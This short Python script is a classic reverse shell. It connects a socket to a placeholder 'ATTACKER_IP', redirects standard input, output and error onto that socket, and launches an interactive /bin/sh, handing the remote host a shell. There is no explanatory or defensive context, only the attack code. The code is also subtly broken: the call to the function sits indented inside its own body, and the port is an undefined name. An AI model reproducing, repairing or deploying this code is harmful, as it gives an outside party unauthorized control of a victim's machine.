import socket
import subprocess
import os

def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))

    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    subprocess.call(['/bin/sh', '-i'])
    reverse_shell('ATTACKER_IP', ATTACKER_PORT)
